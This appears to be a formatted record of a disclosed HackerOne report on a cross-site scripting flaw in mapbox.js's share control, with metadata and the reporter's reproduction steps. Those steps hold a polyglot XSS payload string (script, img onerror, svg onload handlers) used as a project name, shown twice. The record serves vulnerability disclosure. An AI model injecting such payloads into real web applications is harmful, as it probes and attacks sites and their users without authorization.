# XSS in L.mapbox.shareControl in mapbox.js

## Metadata
- **Source:** HackerOne
- **Report:** 99245 | https://hackerone.com/reports/99245
- **Submitted:** 2015-11-12
- **Reporter:** enderun07
- **Program:** Unknown
- **Bounty:** $1,000
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** CVE-2017-1000043
- **Category:** web-api

## Summary
Hi Mapbox

I've found a xss vulnerability on mapbox sharing system.

I've a project called with "'><img src=a onerror=confirm(2)>"><script>alert(1);</script><iframe onload=alert(97)>"><svg onload=alert(2);>"onmouseover="confirm(2);<input onfocus=prompt(1) autofocus>"--> </script><svg/onload=';alert(/XSSPOSED/);'>"

than click it and copy the share URL and go to URL

than click the the marked area 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi Mapbox

I've found a xss vulnerability on mapbox sharing system.

I've a project called with "'><img src=a onerror=confirm(2)>"><script>alert(1);</script><iframe onload=alert(97)>"><svg onload=alert(2);>"onmouseover="confirm(2);<input onfocus=prompt(1) autofocus>"--> </script><svg/onload=';alert(/XSSPOSED/);'>"

than click it and copy the share URL and go to URL

than click the the marked area than you will see the vulnerability



</details>

---
*Analysed by Claude on 2026-05-24*
